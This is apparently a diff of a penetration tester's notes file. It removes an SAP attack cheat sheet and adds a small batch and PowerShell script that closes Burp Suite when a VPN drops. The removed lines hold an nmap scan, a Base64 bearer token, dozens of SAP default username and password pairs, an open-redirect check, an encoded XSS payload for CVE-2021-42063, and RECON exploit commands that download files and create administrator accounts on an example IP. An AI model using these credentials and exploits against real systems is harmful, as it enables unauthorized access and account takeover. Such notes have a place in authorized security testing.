@@ -1,139 +1,24 @@
-https://github.com/redrays-io/SAP-Penetration-Testing
-https://github.com/pondoksiber/SAP-Pentest-Cheatsheet
-https://networkintelligence.ai/sap-security-assessment-methodology-part-2-credential-less-attack-vectors/
-https://github.com/shipcod3/mySapAdventures
-
-nmap -v 192.168.1.100 -p 80,443,3200-3299,3300-3399,8000-8099,8100-8199,50000-59913
-
-https://github.com/chipik/SAP_RECON
-
-
-seclist/SecLists-master/Discovery/Web-Content/sap.txt
-seclist/SecLists-master/Discovery/Web-Content/URLs/urls-sap.txt
-
-Authorization: Bearer VE1TQURNOlBBU1NXT1JE
-
-Say the credentials are TMSADM:PASSWORD
-
-
-for proper authorization checks:
-
-SE38
-SM19
-SUGR
-SE13
-RZ10
-SE38
-SE80
-SA38
-Below is a list of highly sensitive transactions that must be kept blocked in most components unless in the production system and having business requirements:
-
-Archive administration: KA10, KA12, KA16, KA18, SARA
-Reset transaction data: OBR1
-Structural authorization OICP, OOSB
-User maintenance: OMDL, OMEH, OMWF, OOUS, OPF0, OTZ1, OY27, OY28, OY29, OY30
-Profiles: OMEI, OMWG, OOPR, OP15, OPE9, OTZ2, OY21
-Privilege and profile maintenance: OMG7, OMWK, OPF1, OTZ3, OY20
-Structural authorization: OOSP
-Maintenance of user profiles: OVZ6
-Copy by transport request: SCC1
-Deleting a client: SCC5
-Transport organizer (extended): SE01
-Workbench organizer: SE09, SE10
-Table maintenance: SE16, SM30, SM31
-External OS commands: SM49, SM69
-Deleting all users: SU12
+@echo off
+:CheckConnection
+netstat -n | find "VPN_IP" >nul
+if %errorlevel%==1 (
+    # Connection lost
+    powershell.exe -ExecutionPolicy Bypass -File CloseBurp.ps1
+    goto :EOF
+) else (
+    # Connection active
+    timeout /t 60 >nul
+    goto CheckConnection
+)
 
 
 
-gSOAP Parse WSDL
-?wsdl
+# Get the Burp Suite process
+$process = Get-Process -Name "burp" -ErrorAction SilentlyContinue
 
-admin:axis2
-Administrator:manage
-CONTENTSRV:init1234
-CTB_ADMIN:sap123
-DDIC:19920706
-DDIC:Change
-DDIC:SAP4ALL
-Developer:isdev
-EARLYWATCH:support
-EARLYWATCH:SUPPORT
-IDEADM:admin
-itsadmin:init
-Replicator:iscopy
-SAP:6071992
-SAP*:6071992
-sap123:Administrator
-SAP:6071992
-SAP*:6071992
-SAPCPIC:admin
-SAPCPIC:ADMIN
-SAP:PASS
-SAP*:PASS
-SAPR3:SAP
-SAPSUPPORT:init1234
-SMD_ADMIN:init1234
-SMDAGENT_<SID>:init1234
-SMD_AGT:init1234
-SMD_BI_RFC:init1234
-SMD_RFC:init1234
-SOLMAN_ADMIN:init1234
-SOLMAN_BTC:init1234
-SOLMAN<SID><CLNT>:init1234
-TMSADM:$1Pawd2&
-TMSADM:null
-TMSADM:PASSWORD
-WF_BATCH:null
-xmi_demo:sap123
-
-
-
-
------------------------------------------------------------
-
-
-Open Redirection Check
-https://HOST/sap/public/bc/icf/logoff?redirecturl=MALICIOUSURL
-
-Unsecured Protocol (HTTP) Check
-http://HOST:PORT/startPage
-
-http://HOST:PORT/sap/public/info
-
-System Informational Misconfiguration Check
-http://HOST:PORT/sap/public/info
-
-XSS (CVE-2021-42063)
-look for /SAPIrExtHelp https://localhost/SAPIrExtHelp
-
-https://HOST/SAPIrExtHelp/random/%22%3e%3c%53%56%47%20%4f%4e%4c%4f%41%44%3d%26%23%39%37%26%23%31%30%38%26%23%31%30%31%26%23%31%31%34%26%23%31%31%36%28%26%23%78%36%34%26%23%78%36%66%26%23%78%36%33%26%23%78%37%35%26%23%78%36%64%26%23%78%36%35%26%23%78%36%65%26%23%78%37%34%26%23%78%32%65%26%23%78%36%34%26%23%78%36%66%26%23%78%36%64%26%23%78%36%31%26%23%78%36%39%26%23%78%36%65%29%3e.asp
-
-SAP Information System 1.0 Shell Upload
-
-CVE-2022-22536 (ICMAD SAP)
-
-SAP RECON vulnerability (CVE-2020-6287, CVE-2020-6286)
-
-https://github.com/chipik/SAP_RECON
-
-Download zip file
-
-python RECON.py -H 172.16.30.8 -f /1111.zip
-
-Create SAP JAVA user
-
-python RECON.py -H 172.16.30.8 -u
-
-Create SAP JAVA Administrator user
-
-python RECON.py -H 172.16.30.8 -a
-
-
-
------------------------------------------------------------
-
-
-
-
-
+if ($process) {
+    # Close Burp Suite gracefully
+    $process.CloseMainWindow()
+    # Wait for the process to exit
+    $process.WaitForExit()
+}
